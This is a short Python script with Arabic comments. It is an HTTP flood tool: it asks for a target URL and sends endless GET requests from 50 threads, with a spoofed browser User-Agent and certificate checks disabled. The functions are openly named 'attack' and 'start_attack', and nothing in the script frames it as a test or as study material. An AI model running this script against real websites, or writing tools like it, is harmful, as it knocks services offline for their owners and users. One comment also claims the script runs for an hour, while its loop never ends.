import requests
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML، مثل Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

def attack(url):
    session = requests.Session()
    session.verify = False
    while True:
        try:
            response = session.get(url, headers=headers)
            print("تم إرسال الطلب إلى:", url)
        except requests.RequestException as e:
            print("حدث خطأ:", e)
        finally:
            session.close()
        time.sleep(1)  # تأخير لإعطاء وقت للموارد

url = input("أدخل رابط الهدف: ")

def start_attack():
    with ThreadPoolExecutor(max_workers=50) as executor:
        for _ in range(50):  # عدد الخيوط
            executor.submit(attack, url)

start_attack()

while True:
    time.sleep(3600)  # استمر في العمل لمدة ساعة (3600 ثانية)
